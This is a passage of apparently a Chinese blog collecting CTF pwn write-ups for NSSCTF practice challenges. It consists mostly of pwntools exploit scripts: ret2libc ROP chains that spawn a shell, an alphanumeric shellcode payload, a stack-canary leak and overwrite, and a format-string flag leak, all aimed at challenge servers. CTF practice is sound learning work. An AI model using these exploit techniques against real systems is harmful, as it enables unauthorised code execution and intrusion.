class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; p=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28892)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf=ELF(&amp;#x27;./pw&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rdi_pop=0x400733&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret=0x4004c9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main=elf.sym[&amp;#x27;main&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_plt=elf.plt[&amp;#x27;puts&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_got=elf.got[&amp;#x27;puts&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0x20+0x8)+p64(rdi_pop)+p64(puts_got)+p64(puts_plt)+p64(main)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;story!&amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts=u64(p.recvuntil(b&amp;#x27;\x7f&amp;#x27;)[-6:].ljust(8,b&amp;#x27;\x00&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(puts)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc=LibcSearcher(&amp;#x27;puts&amp;#x27;,puts)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_base=puts-libc.dump(&amp;#x27;puts&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system=libc_base+libc.dump(&amp;#x27;system&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;str_bin_sh=libc_base+libc.dump(&amp;#x27;str_bin_sh&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload2=b&amp;#x27;a&amp;#x27;*(0x20+0x8)+p64(ret)+p64(rdi_pop)+p64(str_bin_sh)+p64(system)+p64(main)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;hnctf-2022-week1safe_shellcode&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hnctf-2022-week1safe_shellcode&#34;&gt;#&lt;/a&gt; [HNCTF 2022 Week1]safe_shellcode&lt;/h5&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28251)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=&amp;quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00gao@fossa&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;hgame-2022-week1test-your-gdb&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hgame-2022-week1test-your-gdb&#34;&gt;#&lt;/a&gt; [HGAME 2022 week1]test your gdb&lt;/h5&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;figcaption&gt;&lt;span&gt;pwn import *&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#p = process(&amp;quot;./../testYourGdb&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&amp;quot;./../testYourGdb&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = remote(&amp;quot;1.14.71.254&amp;quot;,28150)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cmpText = p64(0xb0361e0e8294f147) + p64(0x8c09e0c34ed8a6a9)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binsh = 0x401256&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(b&amp;#x27;word\n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.send(cmpText)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recv(0x18)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;canary = u64(p.recv(8))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(hex(canary))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;padding = b&amp;#x27;a&amp;#x27; * (0x28 - 0x10)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = padding + p64(canary) + p64(0) + p64(binsh)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recv()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;hnctf-2022-week1ezr0p64&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hnctf-2022-week1ezr0p64&#34;&gt;#&lt;/a&gt; [HNCTF 2022 Week1]ezr0p64&lt;/h5&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;已经给了.so.6了直接打ret2libc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level=&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.os=&amp;#x27;linux&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf=ELF(&amp;#x27;./ezrop64&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc=ELF(&amp;#x27;./libc.so.6&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28053)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_rdi_ret = 0x4012a3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret = 0x40101a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vuln = elf.sym[&amp;#x27;vuln&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(b&amp;quot;:&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_addr = int(p.recv(14),16)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(puts_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_base = puts_addr - libc.sym[&amp;#x27;puts&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system = libc_base + libc.sym[&amp;#x27;system&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binsh = libc_base + next(libc.search(b&amp;quot;/bin/sh\x00&amp;quot;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = b&amp;#x27;a&amp;#x27;*0x108 + p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;gdouctf-2023真男人下120层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#gdouctf-2023真男人下120层&#34;&gt;#&lt;/a&gt; [GDOUCTF 2023] 真男人下 120 层&lt;/h5&gt;
&lt;p&gt;套着两层 rand 需要定义两次 srand 使用 python 的 ctypes 的库来进行解题&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import ctypes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc=ctypes.CDLL(&amp;#x27;/lib/x86_64-linux-gnu/libc.so.6&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc.srand.argtypes=[ctypes.c_uint]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc.srand(libc.time(0))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rand_result=libc.rand()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc.srand(rand_result%3-1522127470)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28105)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&amp;#x27;trap.&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;for i in range(120):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    rand_r=libc.rand()%4+1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(b&amp;#x27;Floor&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendline(str(rand_r))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;hubuctf-2022-新生赛fmt&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hubuctf-2022-新生赛fmt&#34;&gt;#&lt;/a&gt; [HUBUCTF 2022 新生赛] fmt&lt;/h5&gt;
&lt;p&gt;本地测试查看 flag.txt 被读后的栈地址看到偏移多少利用 % p 来获得 flag&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28473)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# get flag&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 根据 format 和 s 在栈上的相对位置计算读取位置：(0x60 - 0x40 / 8) + 5 = 12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flag_addr = 12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flag = &amp;#x27;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;while True:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(b&amp;#x27;Echo as a service&amp;#x27;, &amp;#x27;%&amp;#123;&amp;#125;$p&amp;#x27;.format(flag_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(b&amp;#x27;0x&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    part = p.recvuntil(b&amp;#x27;\n&amp;#x27;)[:-1]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for i in range(0, len(part), 2):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        index = len(part) - i&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        flag += chr(int(part[index - 2:index].ljust(2, b&amp;#x27;0&amp;#x27;), 16))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(flag)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if &amp;#x27;&amp;#125;&amp;#x27; in flag:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        break&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    flag_addr += 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;hnctf-2022-week1ezcmp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hnctf-2022-week1ezcmp&#34;&gt;#&lt;/a&gt; [HNCTF 2022 Week1]ezcmp&lt;/h5&gt;
&lt;p&gt;ida 查看到他必须要和 buf 相同才能得到 shell 那我们就去 gdb 调试查看 buff 的值 x/10a 可以查看到 buff 的值段把他输进 buf 即可&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#context(log_level=&amp;#x27;debug&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28286)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=p64(0x144678aadc0e4072)+p64(0x84b6e81a4c7eb0e2)+p64(0xf426588abcee2052)+p64(0xc8cb2c5e90c2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
